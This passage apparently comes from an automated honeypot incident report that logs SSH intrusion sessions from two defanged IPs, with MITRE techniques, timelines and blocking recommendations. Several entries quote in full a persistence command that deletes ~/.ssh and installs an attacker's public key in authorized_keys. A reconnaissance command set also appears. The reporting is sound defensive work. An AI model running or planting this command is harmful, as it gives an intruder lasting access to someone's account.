| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:32:10` | `cowrie.session.connect` |
| `2026-06-12 10:32:10` | `cowrie.client.version` |
| `2026-06-12 10:32:10` | `cowrie.client.kex` |
| `2026-06-12 10:32:11` | `cowrie.login.success` |
| `2026-06-12 10:32:11` | `cowrie.session.params` |
| `2026-06-12 10:32:11` | `cowrie.command.input` |
| `2026-06-12 10:32:11` | `cowrie.command.failed` |
| `2026-06-12 10:32:11` | `cowrie.log.closed` |
| `2026-06-12 10:32:12` | `cowrie.session.params` |
| `2026-06-12 10:32:12` | `cowrie.command.input` |
| `2026-06-12 10:32:12` | `cowrie.session.file_download` |
| `2026-06-12 10:32:12` | `cowrie.log.closed` |
| `2026-06-12 10:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2dac00ddec7

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:32 |
| **Last Seen** | 2026-06-12 10:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:32:14` | `cowrie.session.connect` |
| `2026-06-12 10:32:14` | `cowrie.client.version` |
| `2026-06-12 10:32:14` | `cowrie.client.kex` |
| `2026-06-12 10:32:15` | `cowrie.login.success` |
| `2026-06-12 10:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9500b6b39ddc

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:34 |
| **Last Seen** | 2026-06-12 10:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:34:00` | `cowrie.session.connect` |
| `2026-06-12 10:34:00` | `cowrie.client.version` |
| `2026-06-12 10:34:00` | `cowrie.client.kex` |
| `2026-06-12 10:34:01` | `cowrie.login.success` |
| `2026-06-12 10:34:01` | `cowrie.session.params` |
| `2026-06-12 10:34:01` | `cowrie.command.input` |
| `2026-06-12 10:34:01` | `cowrie.command.failed` |
| `2026-06-12 10:34:01` | `cowrie.log.closed` |
| `2026-06-12 10:34:02` | `cowrie.session.params` |
| `2026-06-12 10:34:02` | `cowrie.command.input` |
| `2026-06-12 10:34:02` | `cowrie.session.file_download` |
| `2026-06-12 10:34:02` | `cowrie.log.closed` |
| `2026-06-12 10:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c6287db914

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:34 |
| **Last Seen** | 2026-06-12 10:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:34:04` | `cowrie.session.connect` |
| `2026-06-12 10:34:04` | `cowrie.client.version` |
| `2026-06-12 10:34:04` | `cowrie.client.kex` |
| `2026-06-12 10:34:05` | `cowrie.login.success` |
| `2026-06-12 10:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97f640a3691

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:41 |
| **Last Seen** | 2026-06-12 10:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:41:55` | `cowrie.session.connect` |
| `2026-06-12 10:41:55` | `cowrie.client.version` |
| `2026-06-12 10:41:55` | `cowrie.client.kex` |
| `2026-06-12 10:41:56` | `cowrie.login.success` |
| `2026-06-12 10:41:56` | `cowrie.session.params` |
| `2026-06-12 10:41:56` | `cowrie.command.input` |
| `2026-06-12 10:41:56` | `cowrie.command.failed` |
| `2026-06-12 10:41:57` | `cowrie.log.closed` |
| `2026-06-12 10:41:57` | `cowrie.session.params` |
| `2026-06-12 10:41:57` | `cowrie.command.input` |
| `2026-06-12 10:41:57` | `cowrie.session.file_download` |
| `2026-06-12 10:41:57` | `cowrie.log.closed` |
| `2026-06-12 10:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ccbf2489ba7

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:41 |
| **Last Seen** | 2026-06-12 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:41:59` | `cowrie.session.connect` |
| `2026-06-12 10:41:59` | `cowrie.client.version` |
| `2026-06-12 10:41:59` | `cowrie.client.kex` |
| `2026-06-12 10:42:00` | `cowrie.login.success` |
| `2026-06-12 10:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bc63208d0c

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:51 |
| **Last Seen** | 2026-06-12 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:51:27` | `cowrie.session.connect` |
| `2026-06-12 10:51:27` | `cowrie.client.version` |
| `2026-06-12 10:51:27` | `cowrie.client.kex` |
| `2026-06-12 10:51:28` | `cowrie.login.success` |
| `2026-06-12 10:51:28` | `cowrie.session.params` |
| `2026-06-12 10:51:28` | `cowrie.command.input` |
| `2026-06-12 10:51:28` | `cowrie.command.failed` |
| `2026-06-12 10:51:28` | `cowrie.log.closed` |
| `2026-06-12 10:51:29` | `cowrie.session.params` |
| `2026-06-12 10:51:29` | `cowrie.command.input` |
| `2026-06-12 10:51:29` | `cowrie.session.file_download` |
| `2026-06-12 10:51:29` | `cowrie.log.closed` |
| `2026-06-12 10:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d890c9aadbf

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:51 |
| **Last Seen** | 2026-06-12 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:51:31` | `cowrie.session.connect` |
| `2026-06-12 10:51:31` | `cowrie.client.version` |
| `2026-06-12 10:51:31` | `cowrie.client.kex` |
| `2026-06-12 10:51:32` | `cowrie.login.success` |
| `2026-06-12 10:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d240e707db

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:57 |
| **Last Seen** | 2026-06-12 10:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:57:27` | `cowrie.session.connect` |
| `2026-06-12 10:57:27` | `cowrie.client.version` |
| `2026-06-12 10:57:27` | `cowrie.client.kex` |
| `2026-06-12 10:57:28` | `cowrie.login.success` |
| `2026-06-12 10:57:28` | `cowrie.session.params` |
| `2026-06-12 10:57:28` | `cowrie.command.input` |
| `2026-06-12 10:57:28` | `cowrie.command.failed` |
| `2026-06-12 10:57:28` | `cowrie.log.closed` |
| `2026-06-12 10:57:29` | `cowrie.session.params` |
| `2026-06-12 10:57:29` | `cowrie.command.input` |
| `2026-06-12 10:57:29` | `cowrie.session.file_download` |
| `2026-06-12 10:57:29` | `cowrie.log.closed` |
| `2026-06-12 10:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26696a7db7f

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:57 |
| **Last Seen** | 2026-06-12 10:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:57:31` | `cowrie.session.connect` |
| `2026-06-12 10:57:31` | `cowrie.client.version` |
| `2026-06-12 10:57:31` | `cowrie.client.kex` |
| `2026-06-12 10:57:31` | `cowrie.login.success` |
| `2026-06-12 10:57:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb79ead5de1c

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:59 |
| **Last Seen** | 2026-06-12 10:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:59:31` | `cowrie.session.connect` |
| `2026-06-12 10:59:31` | `cowrie.client.version` |
| `2026-06-12 10:59:31` | `cowrie.client.kex` |
| `2026-06-12 10:59:32` | `cowrie.login.success` |
| `2026-06-12 10:59:32` | `cowrie.session.params` |
| `2026-06-12 10:59:32` | `cowrie.command.input` |
| `2026-06-12 10:59:32` | `cowrie.command.failed` |
| `2026-06-12 10:59:32` | `cowrie.log.closed` |
| `2026-06-12 10:59:32` | `cowrie.session.params` |
| `2026-06-12 10:59:32` | `cowrie.command.input` |
| `2026-06-12 10:59:33` | `cowrie.session.file_download` |
| `2026-06-12 10:59:33` | `cowrie.log.closed` |
| `2026-06-12 10:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd9b2d952d7d

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 10:59 |
| **Last Seen** | 2026-06-12 10:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:59:35` | `cowrie.session.connect` |
| `2026-06-12 10:59:35` | `cowrie.client.version` |
| `2026-06-12 10:59:35` | `cowrie.client.kex` |
| `2026-06-12 10:59:35` | `cowrie.login.success` |
| `2026-06-12 10:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517b0a8de32c

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:01 |
| **Last Seen** | 2026-06-12 11:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:01:32` | `cowrie.session.connect` |
| `2026-06-12 11:01:32` | `cowrie.client.version` |
| `2026-06-12 11:01:32` | `cowrie.client.kex` |
| `2026-06-12 11:01:32` | `cowrie.login.success` |
| `2026-06-12 11:01:33` | `cowrie.session.params` |
| `2026-06-12 11:01:33` | `cowrie.command.input` |
| `2026-06-12 11:01:33` | `cowrie.command.failed` |
| `2026-06-12 11:01:33` | `cowrie.log.closed` |
| `2026-06-12 11:01:33` | `cowrie.session.params` |
| `2026-06-12 11:01:33` | `cowrie.command.input` |
| `2026-06-12 11:01:33` | `cowrie.session.file_download` |
| `2026-06-12 11:01:33` | `cowrie.log.closed` |
| `2026-06-12 11:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-898382fc8b6f

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:01 |
| **Last Seen** | 2026-06-12 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:01:35` | `cowrie.session.connect` |
| `2026-06-12 11:01:35` | `cowrie.client.version` |
| `2026-06-12 11:01:35` | `cowrie.client.kex` |
| `2026-06-12 11:01:36` | `cowrie.login.success` |
| `2026-06-12 11:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-884452b89138

| Field | Detail |
|---|---|
| **Source IP** | `121.239.227[.]101` |
| **First Seen** | 2026-06-12 11:02 |
| **Last Seen** | 2026-06-12 11:04 |
| **Session Duration** | 141s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:02:26` | `cowrie.session.connect` |
| `2026-06-12 11:02:26` | `cowrie.client.version` |
| `2026-06-12 11:02:26` | `cowrie.client.kex` |
| `2026-06-12 11:02:33` | `cowrie.login.failed` |
| `2026-06-12 11:02:34` | `cowrie.login.success` |
| `2026-06-12 11:02:34` | `cowrie.session.params` |
| `2026-06-12 11:02:34` | `cowrie.command.input` |
| `2026-06-12 11:02:34` | `cowrie.command.failed` |
| `2026-06-12 11:02:35` | `cowrie.log.closed` |
| `2026-06-12 11:02:35` | `cowrie.session.params` |
| `2026-06-12 11:02:35` | `cowrie.command.input` |
| `2026-06-12 11:02:35` | `cowrie.log.closed` |
| `2026-06-12 11:02:35` | `cowrie.session.params` |
| `2026-06-12 11:02:35` | `cowrie.command.input` |
| `2026-06-12 11:02:35` | `cowrie.log.closed` |
| `2026-06-12 11:02:36` | `cowrie.session.params` |
| `2026-06-12 11:02:36` | `cowrie.command.input` |
| `2026-06-12 11:02:36` | `cowrie.log.closed` |
| `2026-06-12 11:02:36` | `cowrie.session.params` |
| `2026-06-12 11:02:36` | `cowrie.command.input` |
| `2026-06-12 11:02:36` | `cowrie.log.closed` |
| `2026-06-12 11:02:37` | `cowrie.session.params` |
| `2026-06-12 11:02:37` | `cowrie.command.input` |
| `2026-06-12 11:02:37` | `cowrie.log.closed` |
| `2026-06-12 11:02:37` | `cowrie.session.params` |
| `2026-06-12 11:02:37` | `cowrie.command.input` |
| `2026-06-12 11:02:38` | `cowrie.log.closed` |
| `2026-06-12 11:02:38` | `cowrie.session.params` |
| `2026-06-12 11:02:38` | `cowrie.command.input` |
| `2026-06-12 11:02:38` | `cowrie.log.closed` |
| `2026-06-12 11:02:39` | `cowrie.session.params` |
| `2026-06-12 11:02:39` | `cowrie.command.input` |
| `2026-06-12 11:02:39` | `cowrie.log.closed` |
| `2026-06-12 11:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.239.227[.]101` to AbuseIPDB if not already reported
- [ ] Block `121.239.227[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd03db3525d

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-06-12 11:07 |
| **Last Seen** | 2026-06-12 11:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 11:07:16` | `cowrie.session.connect` |
| `2026-06-12 11:07:16` | `cowrie.client.version` |
| `2026-06-12 11:07:16` | `cowrie.client.kex` |
| `2026-06-12 11:07:17` | `cowrie.login.success` |
| `2026-06-12 11:07:17` | `cowrie.session.params` |
| `2026-06-12 11:07:17` | `cowrie.command.input` |
| `2026-06-12 11:07:17` | `cowrie.command.failed` |
| `2026-06-12 11:07:17` | `cowrie.log.closed` |
| `2026-06-12 11:07:18` | `cowrie.session.params` |
| `2026-06-12 11:07:18` | `cowrie.command.input` |
| `2026-06-12 11:07:18` | `cowrie.session.file_download` |
| `2026-06-12 11:07:18` | `cowrie.log.closed` |
| `2026-06-12 11:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d9e0ad6fc8

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
